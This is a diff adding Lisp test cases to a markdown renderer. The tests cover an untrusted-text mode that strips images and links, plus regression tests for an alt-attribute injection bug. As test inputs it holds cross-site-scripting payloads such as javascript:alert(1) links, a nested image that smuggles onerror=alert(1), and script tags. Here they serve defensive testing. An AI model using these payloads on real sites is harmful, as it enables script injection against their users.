@@ -306,3 +306,317 @@ escaping a double quote, so the safe mode keeps it only when it is a name."
                 (md:render (format nil "```x\" onclick=\"a~%code~%```~%"))))
     (is (search "<pre class=\"c++\"><code>code</code></pre>"
                 (md:render (format nil "```c++~%code~%```~%"))))))
+
+;;; --- a render mode for untrusted text (#1119) ---------------------------------------------
+;;;
+;;; An image is fetched as soon as it is rendered, with no click, so a reply holding an image
+;;; URL makes the reader's machine send that request and whatever the URL carries with it. In a
+;;; desktop webview with no Content-Security-Policy nothing stops it, and following a link
+;;; replaces the app's own page. :IMAGES NIL and :LINKS :TEXT are for text the app did not write.
+
+(defun %untrusted (markdown)
+  (hyperion/markdown:render markdown :images nil :links :text))
+
+(test untrusted-render-emits-no-image-element-and-no-href
+  "#1119: in the untrusted mode no form of image or link reaches the output as markup. Each case
+asserts the ABSENCE of the markup and the PRESENCE of the text that replaces it, because a mode
+that produced nothing at all would satisfy the first half on its own."
+  (dolist (case '(("![alt text](https://elsewhere.example/?d=secret)" . "alt text")
+                  ("![a](/local.png)" . "a")
+                  ("![a](//host.example/i.png)" . "a")
+                  ("[click me](https://elsewhere.example/p)" . "click me")
+                  ("[mail](mailto:a@b.example)" . "mail")
+                  ("[rel](/page)" . "rel")
+                  ("text with ![an image](https://elsewhere.example/i.png) inside" . "an image")
+                  ("text with [a link](https://elsewhere.example/p) inside" . "a link")))
+    (let ((out (%untrusted (car case))))
+      (is-false (search "<img" out) "~S emits no img element: ~A" (car case) out)
+      (is-false (search "href" out) "~S emits no href: ~A" (car case) out)
+      (is-false (search "elsewhere.example" out)
+                "~S does not carry the URL into the output at all: ~A" (car case) out)
+      (is-true (search (cdr case) out)
+               "~S keeps its text ~S: ~A" (car case) (cdr case) out)))
+  ;; A reference link, whose URL lives in a definition elsewhere in the document.
+  ;; A DISTINCTIVE LABEL, because "r" appears in almost any HTML this could produce -- in `<p>',
+  ;; in `href', in any English word -- so searching for it proved nothing about the label
+  ;; surviving (the review of #1120).
+  (let ((out (%untrusted (format nil "[zqlabel][1]~%~%  [1]: https://elsewhere.example/p"))))
+    (is-false (search "href" out) "a reference link emits no href: ~A" out)
+    (is-false (search "elsewhere.example" out) "and does not carry its URL: ~A" out)
+    (is-true (search "zqlabel" out) "but keeps its text: ~A" out))
+  ;; An autolink. In the safe mode 3bmd does not make one at all -- the angle brackets are
+  ;; escaped -- so this asserts the absence rather than claiming the option did the work.
+  (let ((out (%untrusted "<https://elsewhere.example/p>")))
+    (is-false (search "href" out) "an autolink emits no href: ~A" out)))
+
+(test the-default-render-is-unchanged-by-the-untrusted-mode
+  "THE CONTROL for #1119, and the reason the options are opt-in: everything that renders trusted
+content must be untouched. Each case is the same input as the untrusted test above, asserting
+that the default still produces the markup."
+  (dolist (case '(("![alt text](https://elsewhere.example/i.png)" "<img" "alt text")
+                  ("![a](/local.png)" "<img" "/local.png")
+                  ("[click me](https://elsewhere.example/p)" "href" "click me")
+                  ("[mail](mailto:a@b.example)" "href" "mailto:a@b.example")
+                  ("[rel](/page)" "href" "/page")))
+    (destructuring-bind (markdown markup text) case
+      (let ((out (hyperion/markdown:render markdown)))
+        (is-true (search markup out) "~S still renders ~A: ~A" markdown markup out)
+        (is-true (search text out) "and keeps ~S: ~A" text out))))
+  ;; A reference link still renders as a link by default.
+  (let ((out (hyperion/markdown:render
+              (format nil "[zqlabel][1]~%~%  [1]: https://elsewhere.example/p"))))
+    (is-true (search "href" out) "a reference link still renders by default: ~A" out)
+    (is-true (search "zqlabel" out) "with its label: ~A" out))
+  ;; And the refusals #66 added are untouched by the new arguments, in both modes.
+  (dolist (markdown '("[x](javascript:alert(1))" "![x](javascript:alert(1))"))
+    (dolist (out (list (hyperion/markdown:render markdown) (%untrusted markdown)))
+      (is-false (search "javascript" out) "~S is still refused: ~A" markdown out))))
+
+(test the-untrusted-render-arguments-refuse-a-value-they-cannot-honour
+  "#1119: the default is the permissive one, so a typo in a security argument must not read as
+`render everything'. And :ALLOW-HTML T cannot be combined with either mode: raw HTML is not
+parsed into the tree these options filter, so an IMG or HREF written directly in the source
+survives them -- measured, before the combination was refused."
+  ;; THE NAMED CONDITION, not just ERROR: an app has to be able to catch this misuse and nothing
+  ;; else, so the tests name it (the review of #1120).
+  (dolist (bad '(:maybe :no "nil" 0))
+    (signals hyperion/markdown:render-option-error
+      (hyperion/markdown:render "x" :images bad)))
+  (dolist (bad '(:texts :plain "text" nil-is-fine))
+    (signals hyperion/markdown:render-option-error
+      (hyperion/markdown:render "x" :links bad)))
+  ;; And it carries which argument was at fault and what it was given, so a report can say.
+  (let ((c (handler-case (progn (hyperion/markdown:render "x" :links :texts) nil)
+             (hyperion/markdown:render-option-error (e) e))))
+    (is (eq :links (hyperion/markdown:render-option-error-argument c)))
+    (is (eq :texts (hyperion/markdown:render-option-error-value c)))
+    (is-true (search ":LINKS" (princ-to-string c)) "and prints readably: ~A" c))
+  ;; The four accepted combinations are exercised with real markup in
+  ;; EACH-OPTION-ACTS-ON-ITS-OWN-KIND-OF-MARKUP below, not here: rendering "x" showed only that a
+  ;; string came back, which is what let the reference-link bypass survive (the review of #1120).
+  (is-true (stringp (hyperion/markdown:render "x" :images t :links t)))
+  ;; The combination that cannot be honoured.
+  (signals hyperion/markdown:render-option-error
+    (hyperion/markdown:render "x" :allow-html t :images nil))
+  (signals hyperion/markdown:render-option-error
+    (hyperion/markdown:render "x" :allow-html t :links :text))
+  (signals hyperion/markdown:render-option-error
+    (hyperion/markdown:render "x" :allow-html t :images nil :links :text))
+  ;; The control: :ALLOW-HTML T on its own still works, and still passes raw HTML through, which
+  ;; is why the combination above is refused rather than quietly ignored.
+  (let ((out (hyperion/markdown:render "<img src=\"https://elsewhere.example/i.png\">"
+                                       :allow-html t)))
+    (is-true (search "<img" out) "control: raw HTML still passes with :allow-html t alone: ~A" out)))
+
+(test each-option-acts-on-its-own-kind-of-markup
+  "The review of #1120, and the bypass it found. The mixed combinations were only ever rendered
+with the input \"x\", so nothing checked what each option does on its own -- and the untrusted
+tests always set BOTH, so :LINKS :TEXT masked an image surviving :IMAGES NIL.
+
+THE BYPASS: an accepted reference link was returned whole, so its label was never walked. With
+:IMAGES NIL and the default :LINKS T, `[![alt](https://tracker.example/i.png)][r]' kept the
+image and would still have fetched it. Measured before the fix:
+
+  :images nil, :links t -> <p><a href=\"...\"><img src=\"https://tracker.example/i.png\" ...></a></p>
+
+Each row below is one input under all four accepted combinations, asserting what each option is
+responsible for rather than that something came back."
+  (let ((image "![alt](https://img.example/i.png)")
+        (link "[words](https://link.example/p)")
+        (ref-with-image (format nil "[![alt](https://img.example/i.png)][r]~%~%  [r]: https://link.example/p")))
+    (flet ((out (markdown images links)
+             (hyperion/markdown:render markdown :images images :links links)))
+      ;; An image: governed by :IMAGES alone, whatever :LINKS says.
+      (dolist (links '(t :text))
+        (is-true (search "<img" (out image t links))
+                 ":images t keeps the image with :links ~S" links)
+        (is-false (search "<img" (out image nil links))
+                  ":images nil drops it with :links ~S" links)
+        (is-true (search "alt" (out image nil links))
+                 "and leaves the alt text with :links ~S" links))
+      ;; A link: governed by :LINKS alone, whatever :IMAGES says.
+      (dolist (images '(t nil))
+        (is-true (search "href" (out link images t))
+                 ":links t keeps the href with :images ~S" images)
+        (is-false (search "href" (out link images :text))
+                  ":links :text drops it with :images ~S" images)
+        (is-true (search "words" (out link images :text))
+                 "and leaves the text with :images ~S" images))
+      ;; AN IMAGE INSIDE AN ACCEPTED REFERENCE LINK'S LABEL -- the bypass. The link is allowed
+      ;; here, so this is the case where only :IMAGES can stop the fetch.
+      (is-true (search "<img" (out ref-with-image t t))
+               "control: the default keeps both the link and the image")
+      (is-true (search "href" (out ref-with-image nil t))
+               ":links t keeps the reference link")
+      (is-false (search "<img" (out ref-with-image nil t))
+                "but :images nil drops the image inside its label: ~A" (out ref-with-image nil t))
+      (is-false (search "img.example" (out ref-with-image nil t))
+                "and the image URL does not reach the output: ~A" (out ref-with-image nil t))
+      (is-true (search "alt" (out ref-with-image nil t))
+               "while the alt text stays")
+      ;; THE LOOKUP KEY SURVIVES THE SANITISING. The label is rewritten, so the original is kept
+      ;; as the definition; without that the key would change and the href would not resolve.
+      (is-true (search "link.example/p" (out ref-with-image nil t))
+               "the reference still resolves to its definition: ~A" (out ref-with-image nil t))
+      ;; And with links off too, nothing of either remains.
+      (dolist (o (list (out ref-with-image nil :text) (out ref-with-image t :text)))
+        (is-false (search "href" o) "no href with :links :text: ~A" o))
+      (is-false (search "<img" (out ref-with-image nil :text))
+                "and no image with both off"))))
+
+(defun %attribute-value (name html)
+  "The value of the first NAME=\"...\" attribute in HTML, read to the next double quote, or NIL.
+
+READ EXACTLY AS A BROWSER'S TOKENIZER WOULD END IT -- at the first quote, not at the last one on
+the line. That is the whole point of #1132: the injected markup's own quote ended the attribute
+early, and a test that took the value as everything up to the final quote would see one long
+harmless-looking string and miss it."
+  (let ((start (search (concatenate 'string name "=\"") html)))
+    (when start
+      (let* ((from (+ start (length name) 2))
+             (end (position #\" html :start from)))
+        (and end (subseq html from end))))))
+
+(test an-image-inside-an-image-alt-cannot-add-attributes-to-it
+  "#1132, found by the hub's review of #1120, and ON MAIN WITH THE DEFAULT OPTIONS -- not only in
+the untrusted mode, which is what makes it the more serious half of this work.
+
+3bmd renders an image's alt label to HTML and writes the result into alt=\"...\" without escaping
+it, so a nested element put its own markup inside the attribute. Measured at 052737ea:
+
+  ![![x](onerror=alert(1))](outer.png)
+  -> <img src=\"outer.png\" alt=\"<img src=\"onerror=alert(1)\" alt=\"x\" />\" />
+
+The alt value ends at the inner src's first quote and the rest is read as attributes of the
+outer image: ONERROR, with the unquoted value ALERT(1). %SAFE-URL passes that source because it
+is a relative URL, and the outer source then fails to load, which runs the handler.
+
+THE ASSERTION IS ABOUT THE ATTRIBUTE, not about the string ONERROR. An alt text may legitimately
+contain the characters `onerror=alert(1)' as text -- `![![x onerror=alert(1)](i.png)](outer.png)'
+does, harmlessly, inside the quoted value -- so a test grepping the output for ONERROR would
+both miss the real case and fail on a safe one. What must hold is that the alt value ends where
+3bmd meant it to end: no quote and no < inside it, and exactly one IMG in the output."
+  (let ((cases (list "![![x](onerror=alert(1))](outer.png)"
+                     "![![x](i.png)](outer.png)"
+                     "![![x](i.png \"ttl\")](outer.png)"
+                     "![![x](i.png)![y](j.png)](outer.png)"
+                     "![![x onerror=alert(1)](i.png)](outer.png)"
+                     "![a *b* ![n](m.png)](outer.png)"
+                     "![![<script>alert(1)</script>](i.png)](outer.png)"
+                     ;; An entity is written into the attribute raw, so it is worth asserting
+                     ;; that it cannot end one: a character reference is not a quote to the
+                     ;; tokenizer, whatever it decodes to.
+                     "![a &quot; b](o.png)"
+                     "![![a &quot; b](i.png)](outer.png)")))
+    (dolist (md cases)
+      ;; The default options first: this is reached without asking for anything.
+      ;; :ALLOW-HTML T goes through this same branch and had no test of its own (the review of
+      ;; #1133). It cannot be combined with the untrusted options -- that is refused -- so it is
+      ;; its own entry rather than a third axis.
+      (dolist (options '(() (:allow-html t)
+                         (:images t :links t) (:images t :links :text)
+                         (:images nil :links t) (:images nil :links :text)))
+        (let* ((html (apply #'hyperion/markdown:render md options))
+               (images-on (let ((v (getf options :images :unsupplied)))
+                            (or (eq v :unsupplied) v)))
+               (imgs (%count-of "<img" html))
+               (alt (%attribute-value "alt" html)))
+          (if images-on
+              (progn
+                (is (= 1 imgs) "exactly one IMG for ~S with ~S: ~A" md options html)
+                (is-true alt "and it has an alt value for ~S with ~S: ~A" md options html)
+                (is-false (and alt (find #\" alt))
+                          "whose value holds no quote for ~S with ~S: ~A" md options html)
+                (is-false (and alt (find #\< alt))
+                          "and no < for ~S with ~S: ~A" md options html))
+              (is (= 0 imgs) "no IMG at all with :images nil for ~S: ~A" md html))
+          ;; Whatever the options, nothing may close the outer tag early and leave a stray
+          ;; fragment behind as content. The injected markup ended with `/>\"', so the quote
+          ;; was left in the document text.
+          (is-false (search "/>\"" html)
+                    "no stray fragment after an early tag close for ~S with ~S: ~A"
+                    md options html))))))
+
+(test an-alt-label-keeps-its-entities-and-its-word-breaks
+  "The review of #1133, which found two things the alt flattening lost. Both are regressions
+against what #1132 was fixing, so both have a control here.
+
+AN ENTITY WAS ESCAPED TWICE. %LABEL-TEXT wrote the (:ENTITY \"&copy;\") node's text as plain text
+and 3bmd then escaped the ampersand, so alt=\"a &copy; b\" became alt=\"a &amp;copy; b\" and the
+reader saw the markup instead of the character.
+
+A HARD LINE BREAK CONTRIBUTED NOTHING, so the words on either side of one were joined:
+alt=\"line1line2\". It cannot stay a BR -- an attribute cannot hold markup, and writing a literal
+<br/> into the attribute is what the code did BEFORE #1132, measured at 052737ea. A space is what
+is left, because they are separate words.
+
+The emphasis case is here to record a loss that IS intended: an alt attribute cannot hold markup,
+so emphasis and code inside one become their text."
+  (let ((entities (md:render "![a &copy; &quot; b](o.png)"))
+        (broken (md:render (format nil "![line1  ~%line2](o.png)")))
+        (marked (md:render "![a *b* `c` d](o.png)")))
+    (is (equal "a &copy; &quot; b" (%attribute-value "alt" entities))
+        "an entity reaches the alt as itself: ~A" entities)
+    (is-false (search "&amp;copy;" entities)
+              "and is not escaped a second time: ~A" entities)
+    (is (equal "line1 line2" (%attribute-value "alt" broken))
+        "a hard line break separates the words: ~A" broken)
+    (is-false (search "<br" broken)
+              "and does not put a BR in the attribute: ~A" broken)
+    (is (equal "a b c d" (%attribute-value "alt" marked))
+        "while emphasis and code become their text, which an attribute cannot hold: ~A" marked)))
+
+(test an-autolink-in-an-alt-label-renders-as-its-url-escaped-once
+  "The review of #1133, and a crash rather than a wrong render. An autolink's node is POSITIONAL
+-- (:LINK url), not a plist -- and %LABEL-TEXT looked it up with GETF, which signals
+
+  SIMPLE-TYPE-ERROR: malformed property list: (\"https://example.com\")
+
+for `![see <https://example.com>](outer.png)' with :ALLOW-HTML T. The safe mode never builds an
+autolink, because the angle brackets are escaped before 3bmd parses, which is why it went unseen:
+every test of this code ran in the mode where the node cannot occur.
+
+ITS TEXT IS ITS URL, which is what a reader sees when it renders. The URL in the node has already
+been attribute-escaped by %SAFE-URL, so it is decoded before being written and 3bmd escapes it
+once -- the assertions below are on the exact alt value, because escaping it twice is the defect
+next door and `&amp;amp;' is the only thing that distinguishes them."
+  (flet ((alt (markdown &rest options)
+           (%attribute-value "alt" (apply #'hyperion/markdown:render markdown options))))
+    ;; The case that signalled.
+    (is (equal "see https://example.com"
+               (alt "![see <https://example.com>](outer.png)" :allow-html t))
+        "an autolink in an alt label is its URL as text")
+    ;; A URL with an ampersand in it: escaped ONCE. &amp;amp; here would be the double escape.
+    (is (equal "https://a.example/?x=1&amp;y=2"
+               (alt "![<https://a.example/?x=1&y=2>](outer.png)" :allow-html t))
+        "and its ampersand is escaped once, not twice")
+    ;; A refused scheme is not a :LINK node at all -- %SANITIZE-NODE returns the raw text -- so
+    ;; it arrives as a string and keeps its angle brackets.
+    (is (equal "&lt;javascript:alert(1)&gt;"
+               (alt "![<javascript:alert(1)>](outer.png)" :allow-html t))
+        "a refused autolink stays literal text")
+    ;; And in the safe mode, where no autolink node exists, the brackets are text.
+    (is (equal "see &lt;https://example.com&gt;"
+               (alt "![see <https://example.com>](outer.png)"))
+        "the safe mode has no autolink node to flatten")))
+
+(test an-alt-label-escapes-entities-and-code-spans-exactly-once
+  "The review of #1133 asked for exact alt-text assertions on entities, including inside a code
+span. The entity double-escape itself was fixed in 9652057c -- flattening an (:ENTITY ...) node
+into the string made 3bmd escape its ampersand a second time -- and these are the assertions on
+the values rather than on the absence of `&amp;amp;'.
+
+WHAT EACH ONE MEANS IN A BROWSER, since an alt value is read decoded:
+  `Tom &amp; Jerry &copy;'  displays  Tom & Jerry (C)
+  `a &amp;copy; b'          displays  a &copy; b        -- the code span, kept literal
+
+So the second is NOT a double escape even though it looks like one: a code span's content is
+literal text, 3bmd does not parse an entity inside it, and escaping that text once is what makes
+the reader see the spelling the author typed."
+  (flet ((alt (markdown &rest options)
+           (%attribute-value "alt" (apply #'hyperion/markdown:render markdown options))))
+    (dolist (options (list '() '(:allow-html t)))
+      (is (equal "Tom &amp; Jerry &copy;" (apply #'alt "![Tom &amp; Jerry &copy;](outer.png)" options))
+          "entities reach the alt as themselves with ~S" options)
+      (is (equal "a &amp;copy; b" (apply #'alt "![a `&copy;` b](o.png)" options))
+          "an entity spelling inside a code span stays literal with ~S" options))))
